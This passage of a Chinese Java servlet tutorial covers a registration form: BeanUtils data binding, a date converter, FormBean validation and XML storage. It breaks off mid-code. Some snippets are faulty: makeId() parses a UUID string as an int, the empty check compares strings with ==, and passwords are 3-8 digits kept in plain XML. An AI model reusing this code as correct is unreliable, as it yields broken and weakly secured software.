&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

    &lt;span class=&quot;co&quot;&gt;/*&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;    * 将Parameter参数的数据封装到Bean中，为了外边不用强转，这里就使用泛型了！&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;    *&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;    * @request   由于要获取的是Parameter参数的信息，所以需要有request对象&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;    * @tClass    本身是不知道封装什么对象的，所以用class&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;    *&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;    * */&lt;/span&gt;

    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;static&lt;/span&gt; &amp;lt;T&amp;gt; T &lt;span class=&quot;fu&quot;&gt;request2Bean&lt;/span&gt;(HttpServletRequest httpServletRequest, Class&amp;lt;T&amp;gt; tClass) {

        &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt; {

            &lt;span class=&quot;co&quot;&gt;//创建tClass的对象&lt;/span&gt;
            T bean = tClass.&lt;span class=&quot;fu&quot;&gt;newInstance&lt;/span&gt;();

            &lt;span class=&quot;co&quot;&gt;//获取得到Parameter中全部的参数的名字&lt;/span&gt;
            Enumeration enumeration = httpServletRequest.&lt;span class=&quot;fu&quot;&gt;getParameterNames&lt;/span&gt;();

            &lt;span class=&quot;co&quot;&gt;//遍历上边获取得到的集合&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;while&lt;/span&gt; (enumeration.&lt;span class=&quot;fu&quot;&gt;hasMoreElements&lt;/span&gt;()) {

                &lt;span class=&quot;co&quot;&gt;//获取得到每一个带过来参数的名字&lt;/span&gt;
                String name = (String) enumeration.&lt;span class=&quot;fu&quot;&gt;nextElement&lt;/span&gt;();

                &lt;span class=&quot;co&quot;&gt;//获取得到值&lt;/span&gt;
                String value = httpServletRequest.&lt;span class=&quot;fu&quot;&gt;getParameter&lt;/span&gt;(name);

                &lt;span class=&quot;co&quot;&gt;//把数据封装到Bean对象中&lt;/span&gt;
                BeanUtils.&lt;span class=&quot;fu&quot;&gt;setProperty&lt;/span&gt;(bean, name, value);
            }
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; bean;
        } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (Exception e) {
            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();
            &lt;span class=&quot;kw&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; RuntimeException(&lt;span class=&quot;st&quot;&gt;&quot;封装数据到Bean对象中出错了！&quot;&lt;/span&gt;);
        }
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;经过我们测试，&lt;strong&gt;日期不能直接封装到Bean对象中，会直接报出异常&lt;/strong&gt;！&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/Cakq8uI.png&quot;/&gt;&lt;/p&gt;
&lt;ul readability=&quot;-0.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;对于日期而言，需要一个日期转换器。&lt;strong&gt;当BeanUtils的setProperty()方法检测到日期时，会自动调用日期转换器对日期进行转换，从而实现封装！&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;于是乎，就在上面的方法中添加以下一句代码&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;            &lt;span class=&quot;co&quot;&gt;//日期转换器&lt;/span&gt;
            ConvertUtils.&lt;span class=&quot;fu&quot;&gt;register&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;DateLocaleConverter&lt;/span&gt;(), Date.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;);
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;hr/&gt;&lt;ul&gt;&lt;li&gt;还有一个问题，&lt;strong&gt;用户的id不是自己输入的，是由程序生成的。我们避免id的重复，就使用UUID生成用户的id吧！&lt;/strong&gt;为了更好的重用，我们也把它封装成一个方法！&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

    &lt;span class=&quot;co&quot;&gt;/*生成ID*/&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;makeId&lt;/span&gt;() {
        &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; Integer.&lt;span class=&quot;fu&quot;&gt;parseInt&lt;/span&gt;(UUID.&lt;span class=&quot;fu&quot;&gt;randomUUID&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;toString&lt;/span&gt;());
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;好的，我们来测试一下吧！&lt;strong&gt;以下是RegisterServlet的代码&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
        User user = WebUtils.&lt;span class=&quot;fu&quot;&gt;request2Bean&lt;/span&gt;(request, User.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;);
        user.&lt;span class=&quot;fu&quot;&gt;setId&lt;/span&gt;(WebUtils.&lt;span class=&quot;fu&quot;&gt;makeId&lt;/span&gt;());

        &lt;span class=&quot;co&quot;&gt;//调用service层的注册方法，实现注册&lt;/span&gt;
        ServiceBussiness serviceBussiness = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;UserServiceXML&lt;/span&gt;();
        serviceBussiness.&lt;span class=&quot;fu&quot;&gt;register&lt;/span&gt;(user);
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/HbeM4NW.png&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;上面的代码是不够完善的（没有校验用户输入的信息、注册成功或失败都没有给出提示..等等）&lt;/strong&gt;&lt;/p&gt;
&lt;ul readability=&quot;3.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;下面，&lt;strong&gt;我们来校验用户输入的信息吧，如果用户输入的信息不合法，就直接跳转回注册的界面&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;刚才我们是用BeanUtils把Parameter的信息全部直接封装到User对象中，但&lt;strong&gt;现在我想要验证用户提交表单的数据，也应该把表单的数据用一个对象保存着【面向对象的思想、封装、重用】&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;流程是这样子的：&lt;strong&gt;当用户提交表单数据的时候，就把表单数据封装到我们设计的表单对象上，调用表单对象的方法，验证数据是否合法&lt;/strong&gt;！&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;好了，&lt;strong&gt;我们来开发一个表单的对象吧，最重要的是怎么填写validate()方法！&lt;/strong&gt;！&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
&lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; FormBean {

    &lt;span class=&quot;co&quot;&gt;//表单提交过来的数据全都是String类型的，birthday也不例外！&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String username;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String password;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String password2;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String email;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String birthday;
    
    &lt;span class=&quot;co&quot;&gt;/*用于判断表单提交过来的数据是否合法*/&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;validate&lt;/span&gt;() {
        
        &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
        
    }
    
    &lt;span class=&quot;co&quot;&gt;//......各种setter、getter方法&lt;/span&gt;
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;以下是我定下的规则：&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/1Y6xEhC.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;方法的代码如下：&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;12&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;validate&lt;/span&gt;() {

        &lt;span class=&quot;co&quot;&gt;//用户名不能为空，并且要是3-8的字符 abcdABcd&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;username&lt;/span&gt; == &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt; || &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;username&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;trim&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;equals&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;)) {
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;

        } &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; {
            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;username&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;matches&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;[a-zA-Z]{3,8}&quot;&lt;/span&gt;)) {
                &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
            }
        }

        &lt;span class=&quot;co&quot;&gt;//密码不能为空，并且要是3-8的数字&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password&lt;/span&gt; == &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt; || &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;trim&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;equals&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;)) {
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
        } &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; {
            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;matches&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;d{3,8}&quot;&lt;/span&gt;)) {
                &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
            }
        }

        &lt;span class=&quot;co&quot;&gt;//两次密码要一致&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password2&lt;/span&gt; != &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; !&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password2&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;trim&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;equals&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;)) {
            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password2&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;equals&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password&lt;/span&gt;)) {
                &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
            }
        }

        &lt;span class=&quot;co&quot;&gt;//邮箱可以为空，如果为空就必须合法&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;email&lt;/span&gt; != &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; !&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;email&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;trim&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;equals&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;)) {
                &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;email&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;matches&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;w+@&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;w+(&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;w+)+&quot;&lt;/span&gt;)) {

                    System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;邮箱错误了！&quot;&lt;/span&gt;);
                    &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
                }
        }

        &lt;span class=&quot;co&quot;&gt;//日期可以为空，如果为空就必须合法&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;birthday&lt;/span&gt; != &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; !&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;birthday&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;trim&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;equals&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;)) {

            &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt; {
                DateLocaleConverter dateLocaleConverter = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;DateLocaleConverter&lt;/span&gt;();
                dateLocaleConverter.&lt;span class=&quot;fu&quot;&gt;convert&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;birthday&lt;/span&gt;);
            } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (Exception e) {

                System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;日期错误了！&quot;&lt;/span&gt;);
                &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
            }
        }

        
        &lt;span class=&quot;co&quot;&gt;//如果上面都没有执行，那么就是合法的了，返回true&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;true&lt;/span&gt;;
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;处理表单数据的Servlet，代码是这样子的&lt;/strong&gt;：&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;13&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

        &lt;span class=&quot;co&quot;&gt;//将表单的数据封装到formBean中&lt;/span&gt;
        FormBean formBean = WebUtils.&lt;span class=&quot;fu&quot;&gt;request2Bean&lt;/span&gt;(request, FormBean.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;);

        &lt;span class=&quot;co&quot;&gt;//验证表单的数据是否合法，如果不合法就跳转回去注册的页面&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt;(formBean.&lt;span class=&quot;fu&quot;&gt;validate&lt;/span&gt;()==&lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;){
            request.&lt;span class=&quot;fu&quot;&gt;getRequestDispatcher&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/WEB-INF/register.jsp&quot;&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;forward&lt;/span&gt;(request, response);
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt;;
        }
        &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt; {
            
            &lt;span class=&quot;co&quot;&gt;//将表单的数据封装到User对象中&lt;/span&gt;
            User user = WebUtils.&lt;span class=&quot;fu&quot;&gt;request2Bean&lt;/span&gt;(request, User.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;);
            user.&lt;span class=&quot;fu&quot;&gt;setId&lt;/span&gt;(WebUtils.&lt;span class=&quot;fu&quot;&gt;makeId&lt;/span&gt;());

            &lt;span class=&quot;co&quot;&gt;//调用service层的注册方法，实现注册&lt;/span&gt;
            ServiceBussiness serviceBussiness = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;UserServiceXML&lt;/span&gt;();
            serviceBussiness.&lt;span class=&quot;fu&quot;&gt;register&lt;/span&gt;(user);

        } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (Exception e) {
            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();
        }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;接下来我们测试一下吧！&lt;strong&gt;将所有的信息都按照规定的输入！&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/WWEbl6i.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;没有问题！已经将记录写到XML文件上了！&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/x7rkFCX.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;但是，&lt;strong&gt;如果我没有输入日期呢&lt;/strong&gt;？&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/HEjULBB.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;它抛出了错误！原因也非常简单：&lt;strong&gt;表单数据提交给Servlet，Servlet将表单的数据（Parameter中的数据）用BeanUtils封装到User对象中，当封装到日期的时候，发现日期为null，无法转换成日期对象！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那我们现在要怎么解决呢？&lt;/p&gt;
&lt;p&gt;首先我们要明确：因为&lt;strong&gt;我们在设定的时候，已经允许了email和birthday可以为空，那么在DAO层就应该有相应的逻辑判断email和birthday是否为空&lt;/strong&gt;！&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;14&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
            
            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (user.&lt;span class=&quot;fu&quot;&gt;getEmail&lt;/span&gt;() == &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;) {
                newElement.&lt;span class=&quot;fu&quot;&gt;addAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;email&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;);
            } &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; {
                newElement.&lt;span class=&quot;fu&quot;&gt;addAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;email&quot;&lt;/span&gt;, user.&lt;span class=&quot;fu&quot;&gt;getEmail&lt;/span&gt;());

            }

            &lt;span class=&quot;co&quot;&gt;//如果不是空才格式化信息&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (user.&lt;span class=&quot;fu&quot;&gt;getBirthday&lt;/span&gt;() != &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;) {

                &lt;span class=&quot;co&quot;&gt;//日期返回的是指定格式的日期&lt;/span&gt;
                SimpleDateFormat simpleDateFormat = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; SimpleDateFormat(&lt;span class=&quot;st&quot;&gt;&quot;yyyy-MM-dd&quot;&lt;/span&gt;);
                String date = simpleDateFormat&lt;span class=&quot;fu&quot;&gt;.format&lt;/span&gt;(user.&lt;span class=&quot;fu&quot;&gt;getBirthday&lt;/span&gt;());
                
                newElement.&lt;span class=&quot;fu&quot;&gt;addAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;birthday&quot;&lt;/span&gt;, date);
            } &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; {
                newElement.&lt;span class=&quot;fu&quot;&gt;addAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;birthday&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;);
            }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;解决办法：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Parameter中的数据如果是&quot;&quot;,我就不把数据封装到User对象中,执行下一次循环！&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;14&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;static&lt;/span&gt; &amp;lt;T&amp;gt; T &lt;span class=&quot;fu&quot;&gt;request2Bean&lt;/span&gt;(HttpServletRequest httpServletRequest, Class&amp;lt;T&amp;gt; tClass) {

        &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt; {

            &lt;span class=&quot;co&quot;&gt;//创建tClass的对象&lt;/span&gt;
            T bean = tClass.&lt;span class=&quot;fu&quot;&gt;newInstance&lt;/span&gt;();

            &lt;span class=&quot;co&quot;&gt;//获取得到Parameter中全部的参数的名字&lt;/span&gt;
            Enumeration enumeration = httpServletRequest.&lt;span class=&quot;fu&quot;&gt;getParameterNames&lt;/span&gt;();

            &lt;span class=&quot;co&quot;&gt;//日期转换器&lt;/span&gt;
            ConvertUtils.&lt;span class=&quot;fu&quot;&gt;register&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;DateLocaleConverter&lt;/span&gt;(), Date.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;);

            &lt;span class=&quot;co&quot;&gt;//遍历上边获取得到的集合&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;while&lt;/span&gt; (enumeration.&lt;span class=&quot;fu&quot;&gt;hasMoreElements&lt;/span&gt;()) {

                &lt;span class=&quot;co&quot;&gt;//获取得到每一个带过来参数的名字&lt;/span&gt;
                String name = (String) enumeration.&lt;span class=&quot;fu&quot;&gt;nextElement&lt;/span&gt;();

                &lt;span class=&quot;co&quot;&gt;//获取得到值&lt;/span&gt;
                String value = httpServletRequest.&lt;span class=&quot;fu&quot;&gt;getParameter&lt;/span&gt;(name);

                &lt;span class=&quot;co&quot;&gt;//如果Parameter中的数据为&quot;&quot;，那么我就不封装到User对象里边去！执行下一次循环&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (value == &lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;) {
                    &lt;span class=&quot;kw&quot;&gt;continue&lt;/span&gt;;
                } &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; {
                    &lt;span class=&quot;co&quot;&gt;//把数据封装到Bean对象中&lt;/span&gt;
                    BeanUtils.&lt;span class=&quot;fu&quot;&gt;setProperty&lt;/span&gt;(bean, name, value);
                }

            }
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; bean;
        } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (Exception e) {
            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();
            &lt;span class=&quot;kw&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; RuntimeException(&lt;span class=&quot;st&quot;&gt;&quot;封装数据到Bean对象中出错了！&quot;&lt;/span&gt;);
        }
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/84Y9W4r.png&quot;/&gt;&lt;img src=&quot;http://i.imgur.com/02qjFVu.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将数据封装到User对象中还有另外一个办法：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;我们知道BeanUtils有个copyProperties()方法，&lt;strong&gt;可以将某个对象的成员数据拷贝到另外一个对象的成员变量数据上（前提是成员变量的名称相同！）&lt;/strong&gt;我们&lt;strong&gt;FormBean对象的成员变量名称和User对象的成员变量的名称是一致的&lt;/strong&gt;！并且，前面在验证的时候，&lt;strong&gt;我们已经把Parameter中带过来的数据封装到了FormBean对象中了，所以我们可以使用copyProperties()方法！&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;使用该方法时，值得注意的是：&lt;strong&gt;第一个参数是拷贝到哪一个对象上（也就是User对象），第二个参数是被拷贝的对象（也就是formbean对象）,口诀：后拷前....不要搞混了！！！！！(我就是搞混了，弄了很久...)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/e7bOJp0.png&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;处理表单的Servlet完整代码如下&lt;/strong&gt;：&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;14&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
        &lt;span class=&quot;co&quot;&gt;//将表单的数据封装到formBean中&lt;/span&gt;
        FormBean formBean = WebUtils.&lt;span class=&quot;fu&quot;&gt;request2Bean&lt;/span&gt;(request, FormBean.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;);

